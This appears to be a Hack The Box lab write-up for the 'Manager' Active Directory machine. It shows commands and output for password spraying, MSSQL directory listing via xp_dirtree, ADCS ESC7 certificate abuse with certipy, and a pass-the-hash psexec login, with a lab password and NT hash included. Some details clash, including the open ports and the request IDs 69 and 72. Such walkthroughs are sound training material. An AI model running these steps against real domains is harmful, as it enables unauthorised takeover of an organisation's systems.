# Machine Overview

Manager was a medium-ranked Windows Active Directory (AD) machine on HTB, involving the exploitation of **mssql** to read the content of the web. In the **website-backup.zip** file, we obtained the credentials of the **raven** user, which we used to gain initial access to the machine. For privilege escalation, we exploited a misconfigured certificate.

## Scanning through Nmap

First, we'll use Nmap to scan the whole network and find out what services are running. With the **-p-** option, we can check all **65535** ports, and by adding **--min-rate 10000**, we can make the scan faster. After running Nmap, we'll have a list of open ports on the network, and we'll use tools like **cut** and **tr** to filter out only the open ones.

```shell
$ nmap -p- --min-rate 10000 10.10.11.236 -oN ini.txt && cat ini.txt | cut  -d ' ' -f1 | tr -d '/tcp' | tr '\n' ','
80
```

Now let's run a detailed scan on these specific ports using...

```bash
$ nmap -p80 -sC -sV -A -T4 10.10.11.236 -oN scan.txt
```

- **-sC** is to run all the default scripts
- **-sV** for service and version detection
- **-A** to check all default things
- **-T4** for aggressive scan
- **-oN** to write the result into a specified file
 
```bash
Nmap scan report for 10.10.11.236
Host is up (0.29s latency).

 Let's enumerate and check if we have any shares publicly available using `smbclient -L 10.10.11.236` and we found 5 shares
 
```
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
```
 
 Lets run `[enum4linux](https://cheatsheet.haax.fr/network/services-enumeration/135_rpc/) 10.10.11.236` and it found we can login using `password` without providing any username, it also found 
- Domain Name : MANAGER
- Domain Sid : S-1-5-21-4078382237-1492182817-2568127209
 domain name is manager.htb:dc01$@MANAGER.HTB
 Everything we tried so far didn't worked for us Let's try to find out list of users using tool **crackmapexec**. `crackmapexec smb manager.htb  -u 'Anonymous' -p ''  --rid-brute `
- here smb for identiofying we are going to use **smb** **-u** for user **-p** for password and **--rind-brute** is to brute everything like users, grougs etc everything
 And boom we got some user names on machine

 Now we have some Valid username on the DC Lets try to perform password spray against it. first lets create a text file in which we will save all these names and we will check every name as a password against every username
 for password spraying we will use again our loving **crackmapexec**. `crackmapexec smb manager.htb -u user.txt -p user.txt --continue-on-success`. here **--continue-on-success** is to keep checking if it find any valid credientials. we found one valid account with password.

 Lets check if it have access to some smb shares using again our loving **smbclient** using `smbclient   -L \\\\10.10.11.236\\ -U operator%operator`. But we didn't found any useful shares all these shares are default shares

![Screenshot from 2023-11-09 11-41-36](https://github.com/iammR0OT/iammR0OT.github.io/assets/74102381/ea300c4b-d034-4a3e-addd-03306306ebd6)

 I used it in different places but all in vain. At last i think about to password spray at mssql service which we found through nmap scan. i used `crackmapexec mssql  manager.htb -u user.txt -p user.txt -d dc01.manager.htb` here **-d** is denoting our domain controller.  and found again **operator:operator** as a user on **mssql service account**
 
![Screenshot from 2023-11-09 11-51-39](https://github.com/iammR0OT/iammR0OT.github.io/assets/74102381/58ead38e-002e-4ae6-adc2-d8f4b98a950e)

 Lets use this to login into mssql. for this we will use tool called **mssqlclient.py** (`mssqlclient.py` is a Python script belonging to the **Impacket library**, designed for communication with **Microsoft SQL Server** databases. Acting as a command-line interface, it facilitates tasks like querying databases, executing SQL commands, and extracting information using the TDS protocol. Typically employed by security professionals and penetration testers, Impacket tools help assess network and system security. However, it's crucial to emphasize responsible and authorized usage to avoid any legal or ethical complications. Always ensure proper permissions before engaging in security testing activities with such tools.)`mssqlcient.py manager.htb/operator:operator@manager.htb -dc-ip manager.htb -windows-auth` here **-dc-ip** is for domain IP and **-windows-auth** is to use Windows Authentication because we are working on windows environment. And you know what we got a session with mssql.

 Lets Enumerate a it and check it's tables. but we found nothing interesting in it. We see on port 80 webserver is running and the default location of web files in AD environment is `C:\inetpub\wwwroot`. If somehow we can check this directory , we can get juicy information and can check server side code. In **hacktricks** article on testing MSSQL, I found that xp_dirtree can be used to list out directory content through MSSQL. (**xp_dirtree** is an **extended** and **undocumented** `stored procedure` can be used to list all folders and subfolders (recursively) from a given directory. **XP_DIRTREE** has three parameters: Directory — This is the directory you pass when you call the stored procedure; for example, `'D:\Backup_Files'`). To use xp_dirtree in MSSQL we have to use it with **EXEC** command which is used to `run stored procedure` in **MSSQL**. so the syntax will be `EXEC xp_dirtree 'C:\inetpub\wwwroot', 1, 1;` here 1, 1;  is for depth to check by default it will not check file recursively and only check for directories.

 We found one website-backup file in web root directory. Lets download it and check the files inside it. we found on **old-config.xml** file inside it which looks interesting.

# Initial Access

 Let's use these creds to check if we are allowed to use evil-winrm to login to raven account through these credentials.
 
<img  alt="Pasted image 20231226131256" src="https://github.com/iammR0OT/iammR0OT.github.io/assets/74102381/dba39865-2218-4439-b801-f970b85d622b">
 
 Now Let's login to **raven** account using Evil-winrm.

# Privilege Escalation

Let's move towards privilege escalation and check if we have any vulnerable certificate on machine using Certify.exe. We found one **SubCA** with managing Certificate permissions.

<img  alt="Pasted image 20240101235652" src="https://github.com/iammR0OT/iammR0OT.github.io/assets/74102381/b078a05b-883c-4b91-9ac7-001d2ad7b3db">

Let's go to [certipy](https://github.com/ly4k/Certipy#esc7) and check if somehow we can abuse it. We found **ESC7** matching our requirements, 
	1. managing Certificate Authority: which we have.
	2. SubCA enabled: which is also enabled.
	3. Manage Certificate: which we don't have but if we have manage CA right then we can give our user this rights.

## Exploitation

Let's move to Exploitation phase. You have to do these steps fast otherwise it will give you access denied when you request for certificate on fourth step. First we need to add our user raven to manage Certificate user using by adding him as a new officer:

```
➜  manager $ certipy ca -ca 'manager-DC01-CA' -add-officer raven -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123' -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Configuration path: CN=Configuration,DC=manager,DC=htb
[+] Trying to get DCOM connection for: 10.10.11.236
[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
```

Now our user is added, Let's add **SubCA** template to CA by using **-enable-template** parameter.

```
➜  manager $ certipy ca -ca 'manager-DC01-CA' -enable-template SubCA -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
```

Now we need to request for Certificate based on SubCA template. This request will be denied, but we will save the private key and note down the request ID.

```
➜  manager $ certipy req -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target manager.htb -template SubCA -upn administrator@manager.htb 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 69
Would you like to save the private key? (y/N) y
[*] Saved private key to 69.key
[-] Failed to request certificate
```

Now the Key is stored in 69.key file. With our `Manage CA` and `Manage Certificates`, we can then issue the failed certificate request with the `ca` command and the `-issue-request <request ID>` parameter.

```
➜  manager $ certipy ca -ca 'manager-DC01-CA' -issue-request 72 -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

And finally, we can retrieve the issued certificate with the `req` command and the `-retrieve <request ID>` parameter.

```
➜  manager $ certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target manager.htb -retrieve 72
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 72
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '72.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

Lets perform authentication to get the TGT and the hash of Administrative account which we will use further to perform pass-the-hash attack to log into the machine as Administrator

```
➜  manager $ certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236 -username Administrator -domain manager.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb

```

Now Let's perform Pass-the-hash attack to log into the Administrative account

```
➜  manager $ psexec.py manager.htb/Administrator@10.10.11.236 -hashes 'aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef'
